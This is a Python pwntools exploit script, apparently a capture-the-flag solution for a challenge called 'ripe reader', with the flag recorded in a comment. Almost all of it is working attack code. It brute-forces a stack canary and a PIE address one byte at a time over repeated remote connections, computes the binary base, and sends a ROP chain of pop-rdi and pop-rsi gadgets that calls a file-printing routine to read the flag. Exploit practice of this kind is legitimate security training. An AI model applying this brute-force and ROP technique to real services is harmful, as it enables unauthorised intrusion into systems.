#exploit for ripe reader
#flag=flag{should_make_an_ascii_flag_image}
from pwn import *
context.log_level = 'DEBUG'
fpayload="A"*0x38+p8(0)
def bf(fpayload):
	for j in range(7):
		for i in range(256):
				payload=fpayload+p8(i)
				target=remote('one.jh2i.com',50023)
				(target.recvuntil("QUIT\n"))
				target.send(payload)
				r=""
				try:
					r=target.recvuntil("QUIT\n")
					print(r)
				except EOFError:
					print("Process Died")
				finally:
					target.close()
				if("QUIT\n" in r):
					print(hex(i))
					fpayload=payload
					print(hex(u64(fpayload[0x38:].ljust(8,"\x00"))))
					break
	canary=u64(fpayload[0x38:].ljust(8,"\x00"))
	return canary

canary=bf(fpayload)

def bf_pie(fpayload):
	for j in range(5):
		for i in range(256):
				payload=fpayload+p8(i)
				target=remote('one.jh2i.com',50023)
				(target.recvuntil("QUIT\n"))
				target.send(payload)
				r=""
				try:
					r=target.recvuntil("QUIT\n")
					print(r)
				except EOFError:
					print("Process Died 2")
					target.close()
				if("QUIT\n" in r):
					print(hex(i))
					fpayload=payload
					print(hex(u64(fpayload[0x48:].ljust(8,"\x00"))))
					break
	pie_leak=u64(fpayload[0x48:].ljust(8,"\x00"))
	return pie_leak

fpayload="A"*0x38+p64(canary)+"A"*8+p8(0x6)
pie_leak=bf_pie(fpayload)
pie_base=pie_leak-0xe06
print(hex(pie_base))
poprdi=0x1103+pie_base
poprsir15=0x1101+pie_base
flag=0x1128+pie_base
pfile=0xfdc+pie_base
target=remote('one.jh2i.com',50023)

print(target.recvuntil("QUIT\n"))

fpayload="A"*0x38+p64(canary)+"A"*8+p64(poprdi)+p64(4)+p64(poprsir15)+p64(flag)+p64(0x0)+p64(pfile)

target.send(fpayload)
print(target.recv())

target.interactive()
		
	
